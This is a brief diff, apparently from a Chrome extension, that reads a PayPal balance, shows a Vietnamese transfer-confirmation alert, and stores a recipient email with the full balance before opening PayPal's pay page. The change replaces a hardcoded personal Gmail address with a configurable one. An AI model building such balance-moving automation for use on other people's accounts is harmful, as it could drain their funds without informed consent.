@@ -83,7 +83,7 @@ function runStep(step) {
                     const rawText = balanceElement.textContent.trim(); // "$0.00"
                     const numericValue = rawText.replace(/[^0-9.]/g, ''); // 0.00
                     alert("Xác nhận chuyển tiền: " + numericValue)
-                    chrome.storage.local.set({ fillRecipient: "anhphongbkdn123@gmail.com", numericValue: numericValue }, () => {
+                    chrome.storage.local.set({ fillRecipient: data.emailNhan, numericValue: numericValue }, () => {
                         window.location.assign("https://www.paypal.com/myaccount/transfer/homepage/pay");
                     });
                     }
